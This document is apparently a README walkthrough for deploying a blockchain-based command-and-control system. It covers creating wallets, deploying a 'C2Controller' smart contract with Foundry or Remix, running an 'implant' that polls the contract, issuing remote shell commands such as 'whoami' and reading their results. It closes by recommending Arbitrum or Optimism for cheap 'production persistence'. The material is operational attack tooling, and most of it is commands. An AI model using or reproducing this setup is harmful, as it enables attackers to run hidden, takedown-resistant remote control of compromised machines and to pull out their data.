# Deployment Walkthrough

This guide walks through setting up and deploying the C2 smart contract end-to-end, from wallet creation to contract deployment.

---

## 1. Create an Ethereum Wallet

### Option A: MetaMask (GUI — Recommended for Beginners)

1. Install [MetaMask](https://metamask.io/) browser extension
2. Create a new wallet (save the seed phrase **offline**)
3. Switch to **Sepolia** testnet (Settings → Network → Sepolia)
4. Copy your wallet address (starts with `0x`)
5. Export your private key: MetaMask → ⋮ → Account Details → Export Private Key

### Option B: CLI (No Browser)

```bash
# Generate a random 32-byte private key
openssl rand -hex 32 > wallet.key
cat wallet.key
# Example: a1b2c3d4e5f6... (64 hex chars)

# Derive the address (requires Node.js + ethers.js or foundry)
# With Foundry (installed below):
cast wallet address --private-key $(cat wallet.key)
```

** Keep your private key secret. Anyone with it can control your contract.**

---

## 2. Get Free Testnet ETH

You need testnet ETH to pay gas for writes (deploy, issueCommand, submitResult).
Reads are **free** — no gas needed.

### Sepolia Faucets

| Faucet | URL | Notes |
|--------|-----|-------|
| Alchemy | https://sepoliafaucet.com | Free, requires free Alchemy account |
| Infura | https://www.infura.io/faucet/sepolia | Free, requires free Infura account |
| PoWFaucet | https://sepolia-faucet.pk910.de | Mine free ETH (no account needed) |
| LearnWeb3 | https://learnweb3.io/faucets/sepolia | Free |
| Google Cloud | https://cloud.google.com/application/web3/faucet/ethereum/sepolia | Free |

### For BSC Testnet

| Faucet | URL |
|--------|-----|
| BSC Testnet Faucet | https://testnet.bnbchain.org/faucet-smart |

**You need ~0.01 test ETH** — usually one faucet request gives 0.1–0.5 which is plenty.

---

## 3. Get an RPC Endpoint

RPC endpoints let you talk to the blockchain. Two free options:

### Option A: Infura (Recommended)

1. Go to [infura.io](https://infura.io) → Create free account
2. Create a new API Key → **Ethereum** → **Sepolia**
3. Copy your URL: `https://sepolia.infura.io/v3/YOUR_KEY_HERE`

### Option B: Alchemy

1. Go to [alchemy.com](https://alchemy.com) → Create free account
2. Create new App → **Ethereum** → **Sepolia**
3. Copy HTTPS endpoint

### Option C: Public Endpoints (Rate Limited)

```
# Sepolia
https://rpc.sepolia.org
https://sepolia.gateway.tenderly.co
https://ethereum-sepolia.publicnode.com

# BSC Testnet
https://data-seed-prebsc-1-s1.binance.org:8545
```

---

## 4. Install Foundry (Compile + Deploy)

Foundry is the fastest Solidity toolchain.

```bash
# One-liner install
curl -L https://foundry.paradigm.xyz | bash

# Restart your terminal or:
source ~/.bashrc

# Install foundryup
foundryup
```

Verify:

```bash
forge --version
cast --version
```

---

## 5. Compile the Contract

```bash
# Navigate to the project
cd c2-blockchain-contract

# Install OpenZeppelin (required for Ownable)
forge install OpenZeppelin/openzeppelin-contracts

# Compile
forge build

# Extract ABI and bytecode
forge inspect C2Controller abi > contracts/C2Controller.abi
forge inspect C2Controller bytecode > contracts/C2Controller.bin

# View bytecode (copy this into cmd/server/main.go)
cat contracts/C2Controller.bin
```

**Update the bytecode in `cmd/server/main.go`:**
Open the file and replace the placeholder `"0x608060..."` with the actual bytecode from `contracts/C2Controller.bin` (prefix with `0x`).

---

## 6. Deploy the Contract

### Method A: Using the Server Binary

```bash
# Build the server
make build-server

# Deploy (replace with your actual values)
./bin/server deploy \
  https://sepolia.infura.io/v3/YOUR_KEY \
  0xYOUR_PRIVATE_KEY_HEX \
  0xADDITIONAL_OPERATOR_ADDRESS_OPTIONAL

# Output:
# Contract deployed at: 0xABC123...
```

### Method B: Using Forge Cast (Alternative)

```bash
# Single command deploy
forge create \
  --rpc-url https://sepolia.infura.io/v3/YOUR_KEY \
  --private-key YOUR_PRIVATE_KEY \
  --constructor-args 0x0000000000000000000000000000000000000000 \
  contracts/C2Controller.sol:C2Controller

# Output:
# Deployed to: 0x...
```

### Method C: Remix IDE (Browser — No Toolchain Needed)

1. Go to [remix.ethereum.org](https://remix.ethereum.org)
2. Create `C2Controller.sol` file → paste contract source
3. Install plugin: Solidity Compiler → compile `C2Controller`
4. Install plugin: Deploy & Run Transactions
5. Environment: **Injected Provider** (MetaMask)
6. Contract: `C2Controller`
7. Deploy with constructor arg: `0x0000000000000000000000000000000000000000` (or an operator address)
8. Confirm MetaMask tx
9. Copy deployed contract address

---

## 7. Run the Implant

```bash
# Build the client
make build-client

# Run
export ETH_RPC_URL=https://sepolia.infura.io/v3/YOUR_KEY
export CONTRACT_ADDR=0xDEPLOYED_CONTRACT
export PRIVATE_KEY=0xIMPLANT_WALLET_KEY

./bin/client --interval 10 --jitter 3
```

**Note:** The implant needs its own wallet with a small amount of testnet ETH to submit results. You can reuse the deploy wallet or create a new one and fund it from the faucet.

---

## 8. Issue a Command

```bash
# Get the implant ID from the client output:
# "[+] C2 Blockchain Implant"
#     Implant ID:  0xabc123...

./bin/server exec \
  https://sepolia.infura.io/v3/YOUR_KEY \
  0xOPERATOR_PRIVATE_KEY \
  0xCONTRACT_ADDRESS \
  abc123... \
  "whoami"

# The implant will pick it up on the next poll (~10-15s) and submit the result.
```

---

## 9. Read Results

```bash
# Read last 10 results
./bin/server results \
  https://sepolia.infura.io/v3/YOUR_KEY \
  0xCONTRACT_ADDRESS \
  --limit 10
```

---

## Cost Estimates

| Action | Testnet (Sepolia) | Mainnet L2 (Arbitrum/Optimism) | Ethereum L1 |
|--------|-------------------|--------------------------------|-------------|
| Deploy | **Free** (faucet) | ~$0.005 | ~$20–200 |
| issueCommand | **Free** | ~$0.001 | ~$3–15 |
| submitResult | **Free** | ~$0.001 | ~$3–15 |
| getCommand | **Free** | **Free** (view) | **Free** |
| getActiveCommands | **Free** | **Free** | **Free** |

**All read operations are always free.** Only writes (deploy, issueCommand, submitResult, add-op) cost gas.

For production persistence at minimal cost, deploy on Arbitrum or Optimism where commands cost <$0.01 each.

---

## Contract Verification

```bash
# Verify on Sepolia Etherscan
forge verify-contract \
  --chain sepolia \
  --etherscan-api-key YOUR_API_KEY \
  0xCONTRACT_ADDRESS \
  contracts/C2Controller.sol:C2Controller \
  --constructor-args $(cast abi-encode "constructor(address)" 0x0000...)
```

Get an Etherscan API key at [etherscan.io](https://etherscan.io) (free).
